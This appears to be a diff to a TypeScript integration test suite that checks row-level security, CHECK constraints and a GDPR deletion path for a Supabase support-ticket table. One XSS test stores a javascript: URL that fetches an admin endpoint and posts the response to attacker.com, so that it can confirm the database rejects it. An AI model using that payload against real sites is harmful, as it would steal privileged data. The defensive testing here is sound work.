@@ -13,7 +13,7 @@
  *   - .env.test with TEST_*_EMAIL/PASSWORD for student, teacher, super_admin
  *   - Migration 028 applied
  *
- * Coverage (7 cases) :
+ * Coverage (12 cases) :
  *   1. Happy path — authenticated user INSERTs their own ticket
  *   2. User SELECT own tickets → 1+ rows (RLS allow self)
  *   3. Cross-user isolation — user A cannot SELECT user B's tickets (RLS deny)
@@ -21,6 +21,13 @@
  *   5. Anonymous INSERT → permission denied (GRANT layer)
  *   6. User UPDATE own ticket — 0 rows affected (no user update policy)
  *   7. super_admin UPDATE status → audit log row inserted via trigger
+ *
+ * Migration 029 hardening (security-auditor 28/05) :
+ *   8. Forged user_id INSERT rejected — student tries to INSERT as teacher (H2)
+ *   9. type CHECK constraint — INSERT type='malware' rejected (L2)
+ *  10. screenshot_url XSS attempt — INSERT javascript: rejected by CHECK (M1)
+ *  11. status/resolved coherence — status='resolved' without resolved_at rejected (M3)
+ *  12. super_admin DELETE policy — RGPD Art. 17 erasure path (M2)
  */
 
 import { config as loadEnv } from 'dotenv';
@@ -74,6 +81,7 @@ let teacherClient:    SupabaseClient;
 let superAdminClient: SupabaseClient;
 let studentUserId:    string;
 let teacherUserId:    string;
+let superAdminUserId: string;
 
 // Track ticket IDs inserted by tests for explicit cleanup.
 const createdTicketIds: string[] = [];
@@ -88,9 +96,11 @@ beforeAll(async () => {
 
   const { data: studentData } = await studentClient.auth.getUser();
   const { data: teacherData } = await teacherClient.auth.getUser();
-  studentUserId = studentData.user?.id ?? '';
-  teacherUserId = teacherData.user?.id ?? '';
-  if (!studentUserId || !teacherUserId) {
+  const { data: superAdminData } = await superAdminClient.auth.getUser();
+  studentUserId    = studentData.user?.id ?? '';
+  teacherUserId    = teacherData.user?.id ?? '';
+  superAdminUserId = superAdminData.user?.id ?? '';
+  if (!studentUserId || !teacherUserId || !superAdminUserId) {
     throw new Error('Could not resolve test user UUIDs from sessions');
   }
 }, 30_000);
@@ -279,10 +289,15 @@ describe('support_tickets — super_admin UPDATE triggers audit log', () => {
       .eq('action', 'support_ticket_status_change')
       .eq('target_id', ticketId);
 
-    // super_admin transitions status.
+    // super_admin transitions status. Migration 029 M3 CHECK requires
+    // resolved_at + resolved_by to be set together with status=resolved.
     const { error: updErr } = await superAdminClient
       .from('support_tickets')
-      .update({ status: 'resolved', resolved_at: new Date().toISOString() })
+      .update({
+        status: 'resolved',
+        resolved_at: new Date().toISOString(),
+        resolved_by: superAdminUserId,
+      })
       .eq('id', ticketId);
     expect(updErr).toBeNull();
 
@@ -308,6 +323,181 @@ describe('support_tickets — super_admin UPDATE triggers audit log', () => {
       previous_status: 'open',
       new_status: 'resolved',
       ticket_type: 'bug',
+      // Migration 029 enriches metadata with caller_role for forensics.
+      caller_role: 'super_admin',
     });
+  });
+});
+
+// ─── Test 8: Forged user_id INSERT rejected (H2 hardening) ───────────────────
+
+describe('support_tickets — forged user_id INSERT rejected', () => {
+  it.skipIf(SKIP)('student INSERT with teacher user_id rejected by WITH CHECK RLS', async () => {
+    const { error } = await studentClient.from('support_tickets').insert({
+      user_id: teacherUserId, // forged — student tries to impersonate teacher
+      type: 'bug',
+      description: 'Attempting to forge teacher user_id from student session — should be blocked.',
+    });
+    expect(error).not.toBeNull();
+    // RLS WITH CHECK denial surfaces as 42501 or "new row violates row-level security policy".
+    const code = (error as { code?: string })?.code ?? '';
+    const message = error?.message ?? '';
+    expect(code === '42501' || /row-level security|violates/i.test(message)).toBe(true);
+  });
+});
+
+// ─── Test 9: type CHECK constraint (L2) ──────────────────────────────────────
+
+describe('support_tickets — type CHECK constraint', () => {
+  it.skipIf(SKIP)('INSERT with invalid type=malware rejected by CHECK', async () => {
+    const { error } = await studentClient.from('support_tickets').insert({
+      user_id: studentUserId,
+      type: 'malware', // not in ('bug', 'suggestion', 'question')
+      description: 'Attempting to inject invalid type value into enum check.',
+    });
+    expect(error).not.toBeNull();
+    const code = (error as { code?: string })?.code ?? '';
+    const message = error?.message ?? '';
+    // CHECK violation = 23514, but PostgREST may surface different format.
+    expect(code === '23514' || /check|constraint/i.test(message)).toBe(true);
+  });
+});
+
+// ─── Test 10: screenshot_url XSS attempt blocked at DB layer (M1) ────────────
+
+describe('support_tickets — screenshot_url XSS defense (migration 029)', () => {
+  it.skipIf(SKIP)('INSERT with javascript: URL rejected by CHECK constraint', async () => {
+    const { error } = await studentClient.from('support_tickets').insert({
+      user_id: studentUserId,
+      type: 'bug',
+      description: 'XSS attempt via screenshot_url — DB CHECK should block.',
+      screenshot_url: 'javascript:fetch("/api/admin").then(r=>r.text()).then(d=>fetch("https://attacker.com",{method:"POST",body:d}))',
+    });
+    expect(error).not.toBeNull();
+    const code = (error as { code?: string })?.code ?? '';
+    const message = error?.message ?? '';
+    expect(code === '23514' || /check|screenshot_url|supabase_storage/i.test(message)).toBe(true);
+  });
+
+  it.skipIf(SKIP)('INSERT with external HTTPS URL rejected by CHECK constraint', async () => {
+    const { error } = await studentClient.from('support_tickets').insert({
+      user_id: studentUserId,
+      type: 'bug',
+      description: 'External URL screenshot — DB CHECK should block (not Supabase Storage).',
+      screenshot_url: 'https://attacker.com/screenshot.png',
+    });
+    expect(error).not.toBeNull();
+  });
+
+  it.skipIf(SKIP)('INSERT with valid Supabase Storage URL accepted', async () => {
+    const { data, error } = await studentClient
+      .from('support_tickets')
+      .insert({
+        user_id: studentUserId,
+        type: 'bug',
+        description: 'Valid Supabase Storage URL for screenshot — should be accepted.',
+        screenshot_url: 'https://jdnukbpkjyyyjpuwgxhv.supabase.co/storage/v1/object/sign/support_screenshots/test-user/abc.png',
+      })
+      .select('id')
+      .single();
+    expect(error).toBeNull();
+    if (data?.id) createdTicketIds.push(data.id);
+  });
+});
+
+// ─── Test 11: status/resolved coherence CHECK (M3) ───────────────────────────
+
+describe('support_tickets — status/resolved coherence (migration 029)', () => {
+  it.skipIf(SKIP)('UPDATE status=resolved without resolved_at rejected by CHECK', async () => {
+    // Create a fresh open ticket via student
+    const { data: ticket } = await studentClient
+      .from('support_tickets')
+      .insert({
+        user_id: studentUserId,
+        type: 'bug',
+        description: 'Ticket for coherence CHECK validation test.',
+      })
+      .select('id')
+      .single();
+    expect(ticket?.id).toBeTruthy();
+    const ticketId = ticket!.id;
+    createdTicketIds.push(ticketId);
+
+    // super_admin tries to set status=resolved without resolved_at → should fail CHECK
+    const { error } = await superAdminClient
+      .from('support_tickets')
+      .update({ status: 'resolved' }) // no resolved_at, no resolved_by
+      .eq('id', ticketId);
+    expect(error).not.toBeNull();
+    const code = (error as { code?: string })?.code ?? '';
+    const message = error?.message ?? '';
+    expect(code === '23514' || /coherence|check/i.test(message)).toBe(true);
+  });
+});
+
+// ─── Test 12: super_admin DELETE policy (M2 RGPD Art. 17) ────────────────────
+
+describe('support_tickets — super_admin DELETE policy (migration 029)', () => {
+  it.skipIf(SKIP)('student cannot DELETE own ticket (no user delete policy)', async () => {
+    const { data: ticket } = await studentClient
+      .from('support_tickets')
+      .insert({
+        user_id: studentUserId,
+        type: 'bug',
+        description: 'Ticket for student DELETE denial test.',
+      })
+      .select('id')
+      .single();
+    expect(ticket?.id).toBeTruthy();
+    const ticketId = ticket!.id;
+    createdTicketIds.push(ticketId);
+
+    // Student attempts DELETE — RLS DELETE only matches super_admin.
+    const { data, error } = await studentClient
+      .from('support_tickets')
+      .delete()
+      .eq('id', ticketId)
+      .select('id');
+
+    expect(error).toBeNull(); // RLS does not throw, returns empty set.
+    expect(data?.length ?? 0).toBe(0); // 0 rows actually deleted.
+
+    // Verify via super_admin that the row still exists.
+    const { data: verify } = await superAdminClient
+      .from('support_tickets')
+      .select('id')
+      .eq('id', ticketId)
+      .single();
+    expect(verify?.id).toBe(ticketId);
+  });
+
+  it.skipIf(SKIP)('super_admin can DELETE any ticket (RGPD Art. 17 erasure path)', async () => {
+    const { data: ticket } = await studentClient
+      .from('support_tickets')
+      .insert({
+        user_id: studentUserId,
+        type: 'bug',
+        description: 'Ticket for super_admin DELETE / RGPD Art. 17 test.',
+      })
+      .select('id')
+      .single();
+    expect(ticket?.id).toBeTruthy();
+    const ticketId = ticket!.id;
+    // Not added to createdTicketIds — the test itself will delete it.
+
+    const { error } = await superAdminClient
+      .from('support_tickets')
+      .delete()
+      .eq('id', ticketId);
+    expect(error).toBeNull();
+
+    // Verify the row is gone.
+    const { data, error: selErr } = await superAdminClient
+      .from('support_tickets')
+      .select('id')
+      .eq('id', ticketId)
+      .maybeSingle();
+    expect(selErr).toBeNull();
+    expect(data).toBeNull();
   });
 });
